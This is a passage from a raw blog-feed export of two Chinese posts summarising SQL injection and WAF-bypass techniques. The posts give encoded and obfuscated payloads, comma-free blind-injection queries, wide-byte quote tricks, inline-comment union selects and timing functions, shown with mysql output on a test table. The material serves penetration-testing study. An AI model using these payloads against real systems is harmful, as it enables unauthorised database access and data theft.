<span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>使用between a and b判等</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;t&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><h3 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h3><ul><li>使用十六进制</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span>;</span><br></pre></td></tr></table></figure><ul><li>宽字节</li></ul><p>常用在web应用使用的字符集为<code>GBK</code>时，并且过滤了引号，就可以试试宽字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 过滤单引号时</span><br><span class="line">%bf%27 %df%27 %aa%27</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df\’ = %df%5c%27=縗’</span><br></pre></td></tr></table></figure><h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p>sql盲注时常用到以下的函数：</p><ul><li>substr()<ul><li>substr(string, pos, len):从pos开始，取长度为len的子串</li><li>substr(string, pos):从pos开始，取到string的最后</li></ul></li><li>substring()<ul><li>用法和<code>substr()</code>一样</li></ul></li><li>mid()<ul><li>用法和<code>substr()</code>一样，但是<code>mid()</code>是为了向下兼容<code>VB6.0</code>，已经过时，以上的几个函数的pos都是从1开始的</li></ul></li><li>left()和right()<ul><li>left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串</li></ul></li><li>limit<ul><li>limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始</li></ul></li><li>ascii()和char()<ul><li>ascii(char):把char这个字符转为ascii码</li><li>char(ascii_int):和ascii()的作用相反，将ascii码转字符</li></ul></li></ul><p>回到正题，如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用<code>from pos for len</code>，其中pos代表从pos个开始读取len长度的子串<br>例如在<code>substr()</code>等函数中，常规的写法是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> substr(&quot;string&quot;,<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> substr(&quot;string&quot;,<span class="number">1</span>,<span class="number">3</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br><span class="line"><span class="operator">|</span> str                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------+</span></span><br></pre></td></tr></table></figure><ul><li>如果过滤了逗号，可以这样使用<code>from pos for len</code>来取代</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> substr(&quot;string&quot; <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> substr(&quot;string&quot; <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> str                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>在sql盲注中，如果过滤逗号，以下参考下面的写法绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 120;</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| ascii(substr(database() from 1 for 1)) &gt; 120 |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">|                                            0 |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 110;</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| ascii(substr(database() from 1 for 1)) &gt; 110 |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">|                                            1 |</span><br><span class="line">+----------------------------------------------+</span><br></pre></td></tr></table></figure><ul><li>也可使用<code>join</code>关键字来绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users  <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><p>其中的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li>使用<code>like</code>关键字<br>适用于<code>substr()</code>等提取子串的函数中的逗号</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ascii(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ascii(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;r%&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;r%&quot; <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;t%&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;t%&quot; <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br></pre></td></tr></table></figure><ul><li>使用offset关键字<br>适用于<code>limit</code>中的逗号被过滤的情况<br><code>limit 2,1</code>等价于<code>limit 1 offset 2</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><h3 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h3><ul><li>sleep() –&gt;benchmark()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">12</span>,<span class="number">23</span> <span class="keyword">and</span> sleep(<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> <span class="number">23</span> <span class="keyword">and</span> sleep(<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.00</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 </span><br><span class="line">参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">12</span>,<span class="number">23</span> <span class="keyword">and</span> benchmark(<span class="number">1000000000</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> <span class="number">23</span> <span class="keyword">and</span> benchmark(<span class="number">1000000000</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span>                              <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">4.61</span> sec)</span><br></pre></td></tr></table></figure><ul><li>ascii()–&gt;hex()、bin()<br>替代之后再使用对应的进制转string即可</li><li>group_concat()–&gt;concat_ws()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(&quot;str1&quot;,&quot;str2&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(&quot;str1&quot;,&quot;str2&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> str1str2                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">#第一个参数为分隔符</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span> str1,str2                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br></pre></td></tr></table></figure><ul><li>substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</li><li>user() –&gt; @@user、datadir–&gt;@@datadir</li><li>ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</li></ul><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>暂时留空，慢慢更新</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 数据库 - 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入绕过方式总结</title>
      <link href="/2023/11/30/2.SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
      <url>/2023/11/30/2.SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入绕过-方式总结"><a href="#SQL注入绕过-方式总结" class="headerlink" title="SQL注入绕过 方式总结"></a>SQL注入绕过 方式总结</h1><p><a href="javascript:void(0);">渗透测试</a> <a href="javascript:void(0);">sql</a></p><p><a href="https://www.loongten.com/2019/12/28/pentest-learn-sql/">接着上一篇文章</a>讲一讲sql注入绕过</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em>select <code>\*</code> from user where id &#x3D; 1</em> union select 1,2,table_name from information_schema.tables···</p><p>上面这条sql语句，是一条正常的SQL注入语句。它的斜体是后台PHP进行的正常查询，斜体后面的语句则是我们的注入语句。不过实践中，肯定会存在WAF，会对我们输入的空格、SQL语句关键词做处理。那我今天要研究的就是，如何绕过WAF的检测过滤。</p><h1 id="常见的bypass"><a href="#常见的bypass" class="headerlink" title="常见的bypass"></a>常见的bypass</h1><ol><li>id&#x3D;1+(UnIoN)+(SelECT)+</li><li>id&#x3D;1+(UnIoN+SeLeCT)+</li><li>id&#x3D;1+(UnI)(oN)+(SeL)(EcT)</li><li>id&#x3D;1+’UnI’’On’+’SeL’’ECT’ &lt;-MySQL only</li><li>id&#x3D;1+’UnI’||’on’+SeLeCT’ &lt;-MSSQL only</li></ol><h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><p>常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。 例如：waf 过滤了关键字select，可以尝试使用Select等绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = -1 union select 1,2,3</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id = -1 union Select 1,2,3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><h1 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h1><p>在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。</p><h1 id="conv-10-36-代替字母"><a href="#conv-10-36-代替字母" class="headerlink" title="conv(,10,36)代替字母"></a>conv(,10,36)代替字母</h1><p>conv(10,10,36)是大写的A<br>lower(conv(10,10,36&#x2F;16s))小写的a</p><h1 id="限制与from的组合"><a href="#限制与from的组合" class="headerlink" title="限制与from的组合"></a>限制与from的组合</h1><p>用 from. 代替 from</p><h1 id="如果遇到表名或者字段名是保留字"><a href="#如果遇到表名或者字段名是保留字" class="headerlink" title="如果遇到表名或者字段名是保留字"></a>如果遇到表名或者字段名是保留字</h1><p>这个时候最好使用点号连接表名和字段名，或者直接使用反引号包起来</p><h1 id="利用mysql-的特性"><a href="#利用mysql-的特性" class="headerlink" title="利用mysql 的特性"></a>利用mysql 的特性</h1><ol><li><p>当使用自定义的不存在函数的时候就会报错显示出库的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id =a()；</span><br><span class="line">ERROR 1305 (42000): FUNCTION security.a does not exist</span><br></pre></td></tr></table></figure></li><li><p>当查找重复的列的是时候就会报错</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pro_id=2 union select * from (select * from product_2017ctf as A join product_2017ctf as B using(pro_id)) as C</span><br><span class="line">Duplicate column name &#x27;pro_name&#x27;</span><br></pre></td></tr></table></figure><p>注意： MySQL是兼容两个列相同的但是却不兼容在这个基础上再select * from</p><h1 id="在列名被过滤的情况下得到结果"><a href="#在列名被过滤的情况下得到结果" class="headerlink" title="在列名被过滤的情况下得到结果"></a>在列名被过滤的情况下得到结果</h1><p>要在不出现字段名的情况下查出内容，将一个虚拟表和当前表联合起来即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro_id=-1 union select 1,a.4,3,4 from (select 1,2,3,4 from dual union select * from product_2017ctf)a limit 3,1;</span><br></pre></td></tr></table></figure><h1 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h1><ul><li>十六进制绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username = 0x7465737431;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><ul><li><p>ascii 编码绕过</p><p>Test 等价于 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p><p>tip: 好像新版 mysql 不能用了</p></li></ul><p>URLEncode编码，ASCII,HEX,unicode编码绕过</p><ol><li>URL编码：<code>or 1=1</code> 即 <code>%6f%72%20%31%3d%31</code></li><li>url双重编码; <code>?id=1%252f%252a\*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a\*/FROM%252f%252a\*/Users--+</code></li><li>unicode编码</li></ol><p>一些unicode编码举例：</p><p>单引号：’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%u0027 %u02b9 %u02bc</span><br><span class="line">%u02c8 %u2032</span><br><span class="line">%uff07 %c0%27</span><br><span class="line">%c0%a7 %e0%80%a7</span><br></pre></td></tr></table></figure><p>空白：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%u0020 %uff00</span><br><span class="line">%c0%20 %c0%a0 %e0%80%a0</span><br></pre></td></tr></table></figure><p>左括号(:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%u0028 %uff08</span><br><span class="line">%c0%28 %c0%a8</span><br><span class="line">%e0%80%a8</span><br></pre></td></tr></table></figure><p>右括号):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%u0029 %uff09</span><br><span class="line">%c0%29 %c0%a9</span><br><span class="line">%e0%80%a9</span><br></pre></td></tr></table></figure><h1 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h1><p>内联注释就是把一些特有的仅在 MYSQL 上的语句放在 &#x2F;<em>!…</em>&#x2F; 中，这样这些语句如果在其它数据库中是不会被执行，但在 MYSQL 中会执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id = -1 union /*!select*/ 1,2,3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure><p>关键字替换</p><p>逗号绕过</p><p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p><p>limit中可以利用offset来摆脱对逗号的利用</p><p>比较符号(&gt;、&lt;)绕过（greatest、between and)</p><h1 id="过滤-or-and-xor-not-绕过"><a href="#过滤-or-and-xor-not-绕过" class="headerlink" title="过滤 or and xor not 绕过"></a>过滤 or and xor not 绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and = &amp;&amp;</span><br><span class="line">or = ||</span><br><span class="line">xor = | # 异或</span><br><span class="line">not = !</span><br></pre></td></tr></table></figure><h1 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" 